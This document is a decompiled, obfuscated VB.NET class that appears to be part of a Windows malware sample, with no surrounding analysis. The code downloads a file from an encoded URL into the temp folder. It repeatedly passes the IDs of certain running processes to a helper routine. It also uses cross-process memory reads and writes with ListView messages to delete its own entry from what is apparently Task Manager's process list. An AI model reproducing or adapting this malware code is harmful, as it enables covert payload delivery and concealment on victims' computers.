Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports SmartAssembly.Delegates
Imports SmartAssembly.HouseOfCards

Namespace frgoWklvEOSV
	' Token: 0x02000019 RID: 25
	Friend NotInheritable Class PmZcbpYMQkkuHdO
		' Token: 0x0600008D RID: 141 RVA: 0x0000DD1C File Offset: 0x0000BF1C
		Public Shared Function swZUlVwSEWmJw() As String
			If IntPtr.Size = 8 Then
				PFruJiQrcriiZ.KtQjokjXHZXUlt = PmZcbpYMQkkuHdO.vmqHVeneBD(New Uri(PFruJiQrcriiZ.GwTsezEgVAuVAU(PmZcbpYMQkkuHdO.getString_0(107401192))))
			Else
				PFruJiQrcriiZ.KtQjokjXHZXUlt = PmZcbpYMQkkuHdO.vmqHVeneBD(New Uri(PFruJiQrcriiZ.GwTsezEgVAuVAU(PmZcbpYMQkkuHdO.getString_0(107400566))))
			End If
			Return PFruJiQrcriiZ.KtQjokjXHZXUlt
		End Function

		' Token: 0x0600008E RID: 142 RVA: 0x0000DD80 File Offset: 0x0000BF80
		Public Shared Function vmqHVeneBD(uri_0 As Uri) As String
			Try
				Dim text As String = Path.GetRandomFileName().Replace(PmZcbpYMQkkuHdO.getString_0(107400388), PmZcbpYMQkkuHdO.getString_0(107388746)).Remove(0, 3) + PmZcbpYMQkkuHdO.getString_0(107400415)
				Dim webClient As WebClient = New WebClient()
				webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), text))
				Return Path.Combine(Path.GetTempPath(), text)
			Catch
			End Try
			Return String.Empty
		End Function

		' Token: 0x0600008F RID: 143 RVA: 0x0000DE14 File Offset: 0x0000C014
		Public Shared Function bZgooWszMxOy(string_0 As String) As Process
			For Each process As Process In Process.GetProcesses()
				If process.ProcessName.Contains(string_0) Then
					Return process
				End If
			Next
			Return Nothing
		End Function

		' Token: 0x06000090 RID: 144 RVA: 0x0000DE50 File Offset: 0x0000C050
		Public Shared Sub xRTdqUJOGhXP(string_0 As String())
			Dim text As String = PmZcbpYMQkkuHdO.swZUlVwSEWmJw()
			If String.IsNullOrEmpty(text) Then
				Return
			End If
			While True
				For Each text2 As String In string_0
					Dim process As Process = PmZcbpYMQkkuHdO.bZgooWszMxOy(text2)
					If process IsNot Nothing Then
						Dim text3 As String = process.Id.ToString()
						PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text3 + PmZcbpYMQkkuHdO.getString_0(107386850) + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName))
						PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text3 + PmZcbpYMQkkuHdO.getString_0(107386850) + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + PmZcbpYMQkkuHdO.getString_0(107400406))
						PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text3 + PmZcbpYMQkkuHdO.getString_0(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(PmZcbpYMQkkuHdO.getString_0(107400365)))
						PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text3 + PmZcbpYMQkkuHdO.getString_0(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(PmZcbpYMQkkuHdO.getString_0(107387949)))
						PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text3 + PmZcbpYMQkkuHdO.getString_0(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(PmZcbpYMQkkuHdO.getString_0(107400372)))
						PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text3 + PmZcbpYMQkkuHdO.getString_0(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(PmZcbpYMQkkuHdO.getString_0(107400835)))
						PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text3 + PmZcbpYMQkkuHdO.getString_0(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(PmZcbpYMQkkuHdO.getString_0(107403449)))
						PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text3 + PmZcbpYMQkkuHdO.getString_0(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(PmZcbpYMQkkuHdO.getString_0(107400850)))
					End If
				Next
				Thread.Sleep(200)
			End While
		End Sub

		' Token: 0x06000091 RID: 145
		Private Declare Function OpenProcess Lib "kernel32.dll" (int_0 As Integer, bool_0 As Boolean, uint_0 As UInteger) As IntPtr

		' Token: 0x06000092 RID: 146
		Private Declare Function VirtualAllocEx Lib "kernel32.dll" (intptr_0 As IntPtr, intptr_1 As IntPtr, uint_0 As UInteger, int_0 As Integer, int_1 As Integer) As IntPtr

		' Token: 0x06000093 RID: 147
		Private Declare Function VirtualFreeEx Lib "kernel32.dll" (intptr_0 As IntPtr, intptr_1 As IntPtr, uint_0 As UInteger, int_0 As Integer) As Boolean

		' Token: 0x06000094 RID: 148
		Private Declare Function CloseHandle Lib "kernel32.dll" (ieOfaJizIolWkYn As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean

		' Token: 0x06000095 RID: 149
		Private Declare Function WriteProcessMemory Lib "kernel32.dll" (uhimDKeNmQmB As IntPtr, QKkbIiEcaFDJ As IntPtr, pNHDpIOupPgB As Byte(), gpzdSQiksmHIiE As UInteger, <System.Runtime.InteropServices.OutAttribute()> ByRef vAUrzrCfCWv As UIntPtr) As Boolean

		' Token: 0x06000096 RID: 150
		Private Declare Function ReadProcessMemory Lib "kernel32.dll" (sqKIEGwqjOHW As IntPtr, YeBimhgZRdrex As IntPtr, <Out()> VdMDasJSmq As Byte(), GdhqiIqbxsvAnB As Integer, <System.Runtime.InteropServices.OutAttribute()> ByRef EzOMAaxrSvh As UIntPtr) As Boolean

		' Token: 0x06000097 RID: 151
		Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (eUDWVbRwyKtmjb As IntPtr, <System.Runtime.InteropServices.OutAttribute()> ByRef rGOQidRuPe As UInteger) As UInteger

		' Token: 0x06000098 RID: 152
		Private Declare Auto Function SendMessage Lib "user32.dll" (intptr_0 As IntPtr, uint_0 As UInteger, intptr_1 As IntPtr, intptr_2 As IntPtr) As IntPtr

		' Token: 0x06000099 RID: 153
		Private Declare Function FindWindow Lib "user32.dll" (string_0 As String, string_1 As String) As IntPtr

		' Token: 0x0600009A RID: 154
		Private Declare Function FindWindowEx Lib "user32.dll" (intptr_0 As IntPtr, intptr_1 As IntPtr, string_0 As String, string_1 As String) As IntPtr

		' Token: 0x0600009B RID: 155 RVA: 0x0000E048 File Offset: 0x0000C248
		Private Shared Function VpkAJizyuaj(object_0 As Object) As Byte()
			Dim num As Integer = Marshal.SizeOf(object_0)
			Dim array As Byte() = New Byte(num - 1) {}
			Dim intPtr As IntPtr = Marshal.AllocHGlobal(num)
			Marshal.StructureToPtr(object_0, intPtr, True)
			Marshal.Copy(intPtr, array, 0, num)
			Marshal.FreeHGlobal(intPtr)
			Return array
		End Function

		' Token: 0x0600009C RID: 156 RVA: 0x00002AC7 File Offset: 0x00000CC7
		Private Shared Function rBaNxPzSfHF(uint_0 As UInteger) As IntPtr
			Return PmZcbpYMQkkuHdO.OpenProcess(56, False, uint_0)
		End Function

		' Token: 0x0600009D RID: 157 RVA: 0x00002AD2 File Offset: 0x00000CD2
		Private Shared Sub YJhUDGPhSkbuEf(intptr_0 As IntPtr)
			PmZcbpYMQkkuHdO.CloseHandle(intptr_0)
		End Sub

		' Token: 0x0600009E RID: 158 RVA: 0x00002ADB File Offset: 0x00000CDB
		Private Shared Function YAqvBQGcLASTyDa(uint_0 As UInteger, intptr_0 As IntPtr) As IntPtr
			Return PmZcbpYMQkkuHdO.VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4)
		End Function

		' Token: 0x0600009F RID: 159 RVA: 0x00002AEF File Offset: 0x00000CEF
		Private Shared Sub THoLmeHgblkyQDl(intptr_0 As IntPtr, intptr_1 As IntPtr, uint_0 As UInteger)
			PmZcbpYMQkkuHdO.VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768)
		End Sub

		' Token: 0x060000A0 RID: 160 RVA: 0x0000E084 File Offset: 0x0000C284
		Private Shared Function wpcUcLrVrFbBPg() As IntPtr
			Dim intPtr As IntPtr = PmZcbpYMQkkuHdO.FindWindow(PmZcbpYMQkkuHdO.getString_0(107400801), PmZcbpYMQkkuHdO.getString_0(107400776))
			If intPtr = IntPtr.Zero Then
				intPtr = PmZcbpYMQkkuHdO.FindWindow(PmZcbpYMQkkuHdO.getString_0(107400743), PmZcbpYMQkkuHdO.getString_0(107400766))
				intPtr = PmZcbpYMQkkuHdO.FindWindowEx(intPtr, IntPtr.Zero, PmZcbpYMQkkuHdO.getString_0(107400743), Nothing)
				intPtr = PmZcbpYMQkkuHdO.FindWindowEx(intPtr, IntPtr.Zero, PmZcbpYMQkkuHdO.getString_0(107400717), PmZcbpYMQkkuHdO.getString_0(107400728))
			Else
				intPtr = PmZcbpYMQkkuHdO.FindWindowEx(intPtr, IntPtr.Zero, PmZcbpYMQkkuHdO.getString_0(107400743), Nothing)
				intPtr = PmZcbpYMQkkuHdO.FindWindowEx(intPtr, IntPtr.Zero, PmZcbpYMQkkuHdO.getString_0(107400717), PmZcbpYMQkkuHdO.getString_0(107400683))
			End If
			Return intPtr
		End Function

		' Token: 0x060000A1 RID: 161 RVA: 0x00002AFF File Offset: 0x00000CFF
		Private Shared Function VRSjNGIqMPxxrf(intptr_0 As IntPtr) As IntPtr
			Return PmZcbpYMQkkuHdO.SendMessage(intptr_0, 4100UI, IntPtr.Zero, IntPtr.Zero)
		End Function

		' Token: 0x060000A2 RID: 162 RVA: 0x00002B16 File Offset: 0x00000D16
		Private Shared Sub sovqNCrbRXgkN(intptr_0 As IntPtr, intptr_1 As IntPtr)
			PmZcbpYMQkkuHdO.SendMessage(intptr_0, 4104UI, intptr_1, IntPtr.Zero)
		End Sub

		' Token: 0x060000A3 RID: 163 RVA: 0x00002B2A File Offset: 0x00000D2A
		Private Shared Sub FQsCBkWkZKJYOA(intptr_0 As IntPtr)
			PmZcbpYMQkkuHdO.SendMessage(intptr_0, 4124UI, IntPtr.Zero, IntPtr.Zero)
		End Sub

		' Token: 0x060000A4 RID: 164 RVA: 0x0000E178 File Offset: 0x0000C378
		Private Shared Function MRonfAkACEl(intptr_0 As IntPtr, intptr_1 As IntPtr) As String
			Dim array As Byte() = New Byte(49) {}
			Dim egOYnMsXOTjl As PmZcbpYMQkkuHdO.egOYnMsXOTjl = Nothing
			Dim num As UInteger
			PmZcbpYMQkkuHdO.GetWindowThreadProcessId(intptr_0, num)
			Dim intPtr As IntPtr = PmZcbpYMQkkuHdO.rBaNxPzSfHF(num)
			Dim intPtr2 As IntPtr = PmZcbpYMQkkuHdO.YAqvBQGcLASTyDa(CUInt(Marshal.SizeOf(Of PmZcbpYMQkkuHdO.egOYnMsXOTjl)(egOYnMsXOTjl)), intPtr)
			Dim intPtr3 As IntPtr = PmZcbpYMQkkuHdO.YAqvBQGcLASTyDa(50UI, intPtr)
			egOYnMsXOTjl.BxHIHExIvxZU = intptr_1
			egOYnMsXOTjl.YRofDNnXGicoWU = CType(0, IntPtr)
			egOYnMsXOTjl.rLBeAZCTznQk = 50UI
			egOYnMsXOTjl.TDlIPygpdst = intPtr3
			Dim uintPtr As UIntPtr
			PmZcbpYMQkkuHdO.WriteProcessMemory(intPtr, intPtr2, PmZcbpYMQkkuHdO.VpkAJizyuaj(egOYnMsXOTjl), CUInt(Marshal.SizeOf(Of PmZcbpYMQkkuHdO.egOYnMsXOTjl)(egOYnMsXOTjl)), uintPtr)
			PmZcbpYMQkkuHdO.SendMessage(intptr_0, 4141UI, intptr_1, intPtr2)
			PmZcbpYMQkkuHdO.ReadProcessMemory(intPtr, intPtr3, array, 50, uintPtr)
			PmZcbpYMQkkuHdO.THoLmeHgblkyQDl(intPtr, intPtr2, CUInt(Marshal.SizeOf(Of PmZcbpYMQkkuHdO.egOYnMsXOTjl)(egOYnMsXOTjl)))
			PmZcbpYMQkkuHdO.THoLmeHgblkyQDl(intPtr, intPtr3, 50UI)
			PmZcbpYMQkkuHdO.YJhUDGPhSkbuEf(intPtr)
			Return Encoding.ASCII.GetString(array)
		End Function

		' Token: 0x060000A5 RID: 165 RVA: 0x0000E250 File Offset: 0x0000C450
		Private Shared Sub eYeipYCyEPEx(string_0 As String)
			Dim intPtr As IntPtr = PmZcbpYMQkkuHdO.wpcUcLrVrFbBPg()
			If intPtr <> IntPtr.Zero Then
				Dim num As Integer = CInt(PmZcbpYMQkkuHdO.VRSjNGIqMPxxrf(intPtr))
				For i As Integer = 0 To num - 1
					Dim text As String = PmZcbpYMQkkuHdO.MRonfAkACEl(intPtr, CType(i, IntPtr))
					If text.Contains(string_0) Then
						PmZcbpYMQkkuHdO.sovqNCrbRXgkN(intPtr, CType(i, IntPtr))
					End If
				Next
			End If
		End Sub

		' Token: 0x060000A6 RID: 166 RVA: 0x0000E2AC File Offset: 0x0000C4AC
		Private Shared Sub RkWwqjeVZT()
			Dim intPtr As IntPtr = PmZcbpYMQkkuHdO.wpcUcLrVrFbBPg()
			If intPtr <> IntPtr.Zero Then
				PmZcbpYMQkkuHdO.FQsCBkWkZKJYOA(intPtr)
				PmZcbpYMQkkuHdO.FQsCBkWkZKJYOA(intPtr)
				PmZcbpYMQkkuHdO.FQsCBkWkZKJYOA(intPtr)
				PmZcbpYMQkkuHdO.FQsCBkWkZKJYOA(intPtr)
				PmZcbpYMQkkuHdO.FQsCBkWkZKJYOA(intPtr)
			End If
		End Sub

		' Token: 0x060000A7 RID: 167 RVA: 0x0000E2EC File Offset: 0x0000C4EC
		Public Shared Sub SmzpdOGqBUsqf()
			Dim thread As Thread = AddressOf PmZcbpYMQkkuHdO.YuQxyPaMUrM
			thread.Start()
		End Sub

		' Token: 0x060000A8 RID: 168 RVA: 0x0000E314 File Offset: 0x0000C514
		Private Shared Sub YuQxyPaMUrM()
			While Not PmZcbpYMQkkuHdO.NPrbAlPzPDdY
				If PmZcbpYMQkkuHdO.zsxmbThfoIv Then
					PmZcbpYMQkkuHdO.eYeipYCyEPEx(Process.GetCurrentProcess().ProcessName + PmZcbpYMQkkuHdO.getString_0(107400415))
					Thread.Sleep(525)
				Else
					PmZcbpYMQkkuHdO.RkWwqjeVZT()
					Thread.Sleep(1000)
				End If
			End While
			PmZcbpYMQkkuHdO.NPrbAlPzPDdY = False
		End Sub

		' Token: 0x060000AA RID: 170 RVA: 0x00002B42 File Offset: 0x00000D42
		' Note: this type is marked as 'beforefieldinit'.
		Shared Sub New()
			Strings.CreateGetStringDelegate(GetType(PmZcbpYMQkkuHdO))
			PmZcbpYMQkkuHdO.NPrbAlPzPDdY = False
			PmZcbpYMQkkuHdO.zsxmbThfoIv = True
		End Sub

		' Token: 0x0400009E RID: 158
		Private Shared NPrbAlPzPDdY As Boolean

		' Token: 0x0400009F RID: 159
		Public Shared zsxmbThfoIv As Boolean

		' Token: 0x040000A0 RID: 160
		<NonSerialized()>
		Friend Shared getString_0 As GetString

		' Token: 0x0200001A RID: 26
		Private Structure egOYnMsXOTjl
			' Token: 0x040000A1 RID: 161
			Public ZZFIMbxLgzthaR As UInteger

			' Token: 0x040000A2 RID: 162
			Public BxHIHExIvxZU As IntPtr

			' Token: 0x040000A3 RID: 163
			Public YRofDNnXGicoWU As IntPtr

			' Token: 0x040000A4 RID: 164
			Public oNjdwbdRHgy As UInteger

			' Token: 0x040000A5 RID: 165
			Public nmVNOKbSciLW As UInteger

			' Token: 0x040000A6 RID: 166
			Public TDlIPygpdst As IntPtr

			' Token: 0x040000A7 RID: 167
			Public rLBeAZCTznQk As UInteger

			' Token: 0x040000A8 RID: 168
			Public NYhBjqLGSmMKnsl As Integer

			' Token: 0x040000A9 RID: 169
			Public nQYKRLEKQiaDAB As IntPtr
		End Structure
	End Class
End Namespace
